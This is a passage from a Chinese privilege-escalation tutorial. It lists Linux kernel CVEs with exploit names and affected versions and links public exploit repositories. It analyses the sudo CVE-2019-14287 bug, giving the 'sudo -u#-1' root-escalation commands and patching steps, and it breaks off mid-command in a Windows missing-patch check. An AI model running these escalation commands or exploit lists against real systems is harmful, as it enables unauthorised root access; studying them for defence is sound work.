CVE<span class="token operator">-</span><span class="token number">2009</span><span class="token operator">-</span><span class="token number">2692</span> <span class="token punctuation">[</span>sock_sendpage2<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.4</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.25</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.28</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.36</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.37</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2009</span><span class="token operator">-</span><span class="token number">1337</span> <span class="token punctuation">[</span>exit_notify<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2009</span><span class="token operator">-</span><span class="token number">1185</span> <span class="token punctuation">[</span>udev<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2008</span><span class="token operator">-</span><span class="token number">4210</span> <span class="token punctuation">[</span>ftrex<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2008</span><span class="token operator">-</span><span class="token number">0600</span> <span class="token punctuation">[</span>vmsplice2<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2008</span><span class="token operator">-</span><span class="token number">0600</span> <span class="token punctuation">[</span>vmsplice1<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token number">.1</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2006</span><span class="token operator">-</span><span class="token number">3626</span> <span class="token punctuation">[</span>h00lyshit<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2006</span><span class="token operator">-</span><span class="token number">2451</span> <span class="token punctuation">[</span>raptor_prctl<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2005</span><span class="token operator">-</span><span class="token number">0736</span> <span class="token punctuation">[</span>krad3<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2005</span><span class="token operator">-</span><span class="token number">1263</span> <span class="token punctuation">[</span>binfmt_elf<span class="token punctuation">.</span>c<span class="token punctuation">]</span> <span class="token punctuation">(</span>Linux kernel <span class="token number">2.</span>x<span class="token punctuation">.</span>x to <span class="token number">2.2</span><span class="token number">.27</span><span class="token operator">-</span>rc2<span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token punctuation">.</span>x to <span class="token number">2.4</span><span class="token number">.31</span><span class="token operator">-</span>pre1<span class="token punctuation">,</span> and <span class="token number">2.6</span><span class="token punctuation">.</span>x to <span class="token number">2.6</span><span class="token number">.12</span><span class="token operator">-</span>rc4<span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2004</span><span class="token operator">-</span><span class="token number">1235</span> <span class="token punctuation">[</span>elflbl<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.4</span><span class="token number">.29</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span>N<span class="token operator">/</span>A <span class="token punctuation">[</span>caps_to_root<span class="token punctuation">]</span>  <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2004</span><span class="token operator">-</span><span class="token number">0077</span> <span class="token punctuation">[</span>mremap_pte<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.4</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.27</span><span class="token punctuation">)</span>
</code></pre>
<p><strong>已对外公开 exp 注：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>SecWiki<span class="token operator">/</span>linux<span class="token operator">-</span>kernel<span class="token operator">-</span>exploits

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Kabot<span class="token operator">/</span>Unix<span class="token operator">-</span>Privilege<span class="token operator">-</span>Escalation<span class="token operator">-</span>Exploits<span class="token operator">-</span>Pack<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>xairy<span class="token operator">/</span>kernel<span class="token operator">-</span>exploits
</code></pre>
<hr>
<h2><a id="6112_Sudo_CVE201914287_3451"></a>6.1.1.2 Sudo漏洞分析 (CVE-2019-14287)</h2>
<p><strong>1、漏洞介绍</strong></p>
<p>最近的国外的团队跟踪并披露了该漏洞，报告中发现，在所有sudo版本低于1.8.29 的Linux机器，均受到该漏洞的影响。</p>
<p>此漏洞可以使用户拥有权限运行其他用户命令。</p>
<p><strong>2、漏洞细节</strong></p>
<p>sudo允许非特权用户以root用户身份执行命令，问题在于在sudo id 在1.8.28之前的版本中以任意用户实现了运行命令的方式，虽然攻击的利用方式，需要对本地配置进行修改，利用此漏洞需要恶意用户具有以任何用户（root用户除外）身份运行命令的特权，如果sudoers文件ALL中Runas参数带有特殊值，则可以利用成功。</p>
<p>在你的Linux机器上运行一下命令。</p>
<pre><code class="prism language-c">sudo <span class="token operator">-</span>V <span class="token operator">|</span> grep <span class="token string">'Sudo version'</span>
</code></pre>
<p>即可查看是否受到该版本（低于1.8.29）的影响</p>
<p><strong>3、漏洞分析</strong></p>
<p>sudo程序本身是一个设置的SUID位的二进制文件。我们可以检查一下他的权限：</p>
<pre><code class="prism language-c">ls <span class="token operator">-</span>l <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>sudo
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201004203754701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
它的所有者是root,所以每个用户都已像root那样执行该程序。设置了SUID的程序在运行时可以给使用者以所有者的EUID</p>
<p>sudo的配置都记录在/etc/sudoers文件中，配置文件知名哪些用户可以执行哪些命令。要使用sudo，用户只须提供sudo用户的密码。</p>
<p>那么本次漏洞的命令就是</p>
<pre><code class="prism language-c">sudo <span class="token operator">-</span>uusername#uidUSer
</code></pre>
<p>因为需要用户执行此命令，那么需要用户的sudoers中的runas说明具有特殊值ALL</p>
<p>查看一下/etc/sudoers<br>
<img src="https://img-blog.csdnimg.cn/20201004203826983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>配置文件分析</strong></p>
<p>%开头，代表”将要授权组“，例如其中的%admin、%sudo。</p>
<p>%不开头的，代表”将要授权的用户“，例如其中的root。</p>
<pre><code class="prism language-c">root ALL<span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">:</span>ALL<span class="token punctuation">)</span> ALL
</code></pre>
<p>第一个ALL的意思是root用户在那些服务器上登录本服务器来执行sudo命令。<br>
第二个和第三个ALL则表示可以切换到任何（用户:组）。<br>
第四个为ALL，则表示可以执行任意命令。</p>
<p>例如图中，已经添加了</p>
<pre><code class="prism language-c">testuser ALL<span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">:</span>ALL<span class="token punctuation">)</span> ALL
</code></pre>
<p>修改后那么在恶意用户下，则可以运行一下命令将自己升级为root</p>
<pre><code class="prism language-c">sudo <span class="token operator">-</span>u#<span class="token operator">-</span><span class="token number">1</span> id <span class="token operator">-</span>u
</code></pre>
<p>或者</p>
<pre><code class="prism language-c">sudo <span class="token operator">-</span>u#<span class="token number">4294967295</span> id <span class="token operator">-</span>u
</code></pre>
<p>在32位或者64位机，C语言中整数存储占用4个字节，一个字节8位，共计32位</p>
<p>整数在计算机中以补码形式存储，-1的补码为32个1组成的二进制数，按无符号数输出这个二进制数<br>
就是2^32-1=4294967295</p>
<p>由于采用补码表示整数，计算机本身不关心整数是正数还是负数，统一按无符号数对待。具体输出时，显示为什么数，计算机按编程者的格式要求进行处理输出。如32个1组成的二进制数，按%d输出就是-1，按无符号输出就是 4294967295。</p>
<p>这也就是在-1和4294967295的时候 sudo 对其ID值无效，实际上他们返回的值为0<br>
<img src="https://img-blog.csdnimg.cn/20201004203958237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过分析sudo的源码分析</p>
<pre><code class="prism language-c"><span class="token keyword">void</span>

<span class="token function">exec_cmnd</span><span class="token punctuation">(</span><span class="token keyword">struct</span> command_details <span class="token operator">*</span>details<span class="token punctuation">,</span> <span class="token keyword">struct</span> command_status <span class="token operator">*</span>cstat<span class="token punctuation">,</span>

    <span class="token keyword">int</span> errfd<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

    <span class="token function">debug_decl</span><span class="token punctuation">(</span>exec_cmnd<span class="token punctuation">,</span> SUDO_DEBUG_EXEC<span class="token punctuation">)</span>



    <span class="token function">restore_signals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">exec_setup</span><span class="token punctuation">(</span>details<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> true<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">/* headed for execve() */</span>

        <span class="token function">sudo_debug_execve</span><span class="token punctuation">(</span>SUDO_DEBUG_INFO<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>command<span class="token punctuation">,</span>

                          details<span class="token operator">-&gt;</span>argv<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>envp<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">sudo_execve</span><span class="token punctuation">(</span>details<span class="token operator">-&gt;</span>command<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>argv<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>envp<span class="token punctuation">,</span>

                    <span class="token function">ISSET</span><span class="token punctuation">(</span>details<span class="token operator">-&gt;</span>flags<span class="token punctuation">,</span> CD_NOEXEC<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        cstat<span class="token operator">-&gt;</span>type <span class="token operator">=</span> CMD_ERRNO<span class="token punctuation">;</span>

        cstat<span class="token operator">-&gt;</span>val <span class="token operator">=</span> errno<span class="token punctuation">;</span>

        <span class="token function">sudo_debug_printf</span><span class="token punctuation">(</span>SUDO_DEBUG_ERROR<span class="token punctuation">,</span> <span class="token string">"unable to exec %s: %s"</span><span class="token punctuation">,</span>

                          details<span class="token operator">-&gt;</span>command<span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    debug_return<span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre>
<p>其中exec_setup,SUD0_DEBUG_EXEC,可以执行组ID，及创建掩码</p>
<pre><code class="prism language-c">bool

<span class="token function">exec_setup</span><span class="token punctuation">(</span><span class="token keyword">struct</span> command_details <span class="token operator">*</span>details<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptyname<span class="token punctuation">,</span> <span class="token keyword">int</span> ptyfd<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

    bool rval <span class="token operator">=</span> false<span class="token punctuation">;</span>

    <span class="token function">debug_decl</span><span class="token punctuation">(</span>exec_setup<span class="token punctuation">,</span> SUDO_DEBUG_EXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">unlimit_nproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token macro property">#<span class="token directive keyword">ifdef</span> HAVE_SETRESUID</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setresuid</span><span class="token punctuation">(</span>details<span class="token operator">-&gt;</span>uid<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>euid<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token function">sudo_warn</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to change to runas uid (%u, %u)"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>uid<span class="token punctuation">,</span>

        details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">goto</span> done<span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

<span class="token macro property">#<span class="token directive keyword">elif</span> defined(HAVE_SETREUID)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setreuid</span><span class="token punctuation">(</span>details<span class="token operator">-&gt;</span>uid<span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token function">sudo_warn</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to change to runas uid (%u, %u)"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

        <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>details<span class="token operator">-&gt;</span>uid<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">goto</span> done<span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

<span class="token macro property">#<span class="token directive keyword">else</span></span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seteuid</span><span class="token punctuation">(</span>details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">setuid</span><span class="token punctuation">(</span>details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token function">sudo_warn</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to change to runas uid (%u, %u)"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> details<span class="token operator">-&gt;</span>uid<span class="token punctuation">,</span>

        details<span class="token operator">-&gt;</span>euid<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">goto</span> done<span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

<span class="token macro property">#<span class="token directive keyword">endif</span> </span><span class="token comment">/* !HAVE_SETRESUID &amp;&amp; !HAVE_SETREUID */</span>



    <span class="token comment">/* Restore previous value of RLIMIT_NPROC. */</span>

    <span class="token function">restore_nproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



    rval <span class="token operator">=</span> true<span class="token punctuation">;</span>



done<span class="token punctuation">:</span>

    <span class="token function">debug_return_bool</span><span class="token punctuation">(</span>rval<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre>
<p>通过源码分析</p>
<p>其中有三个函数可以设置用户权限</p>
<pre><code class="prism language-c">setresuid

setreuid

seteuid
</code></pre>
<p>其中的函数在root权限时参数可以改变为任何ID，<br>
sudo程序最初会调用了setuid(root_uid)使程序的进程获得的root权限,通过前面的ls -l /usr/bin/sudo已经检验过了</p>
<p>所以这三个函数都能修改进程的用户所获得的权限。因为默认情况下sudo会将权限提升为root<br>
在出现整数溢出的时候，-1或者4294967295则被判断为0返回为真，则使得权限升级为root。<br>
调用setuid将我们的恶意用户设置为root,从而执行任意命令。</p>
<p><img src="https://img-blog.csdnimg.cn/20201004204106840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>4、漏洞修复</strong></p>
<p><strong>Debian:</strong></p>
<pre><code class="prism language-c">sudo apt<span class="token operator">-</span>get update <span class="token operator">&amp;</span> apt<span class="token operator">-</span>get upgrade sudo apt<span class="token operator">-</span>get upgrade sudo
</code></pre>
<p><strong>RHEL:</strong></p>
<pre><code class="prism language-c">yum update

yum update sudo
</code></pre>
<p>最后通过检查sudo的版本号是否大于等于1.8.29</p>
<pre><code class="prism language-c">sudo <span class="token operator">-</span>V <span class="token operator">|</span> grep <span class="token string">'Sudo version'</span>
</code></pre>
<p>参考</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sudo<span class="token punctuation">.</span>ws<span class="token operator">/</span>alerts<span class="token operator">/</span>minus_1_uid<span class="token punctuation">.</span>html
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sudo<span class="token punctuation">.</span>ws<span class="token operator">/</span>sudo<span class="token operator">/</span>man<span class="token operator">/</span><span class="token number">1.8</span><span class="token number">.2</span><span class="token operator">/</span>sudoers<span class="token punctuation">.</span>man<span class="token punctuation">.</span>html
</code></pre>
<hr>
<h2><a id="6113_Linux_3696"></a>6.1.1.3 Linux提权之内核提权</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>imbawenzi<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">/</span><span class="token number">04</span><span class="token operator">/</span><span class="token number">09</span><span class="token operator">/</span>A<span class="token operator">%</span><span class="token number">20</span>guide<span class="token operator">%</span><span class="token number">20</span>to<span class="token operator">%</span><span class="token number">20L</span>inux<span class="token operator">%</span><span class="token number">20</span>Privilege<span class="token operator">%</span><span class="token number">20</span>Escalation<span class="token operator">-</span>Linux提权指南<span class="token operator">/</span>

anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">98628</span>  <span class="token operator">--</span><span class="token operator">-</span>详解Linux权限提升的攻击与防护
</code></pre>
<p>这两篇文章写得非常好，仔细看完就懂了…</p>
<hr>
<h2><a id="612_Windows_3706"></a>6.1.2 Windows</h2>
<h2><a id="6121_windowsexp_3707"></a>6.1.2.1 windows提权-快速查找exp</h2>
<p>微软官方时刻关注列表网址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>technet<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>library<span class="token operator">/</span>security<span class="token operator">/</span>dn639106<span class="token punctuation">.</span>aspx
</code></pre>
<p>地址更新为：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>security<span class="token operator">-</span>updates<span class="token operator">/</span>securitybulletins<span class="token operator">/</span><span class="token number">2017</span><span class="token operator">/</span>securitybulletins2017
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201004210236761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
比如常用的几个已公布的 exp：</p>
<pre><code class="prism language-c">KB2592799
KB3000061
KB2592799
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p>
<pre><code class="prism language-c">systeminfo<span class="token operator">&gt;</span>micropoor<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token keyword">for</span> <span class="token operator">%</span>i in <span class="token punctuation">(</span> KB977165 KB2160329 KB2503665 KB2592799
KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904
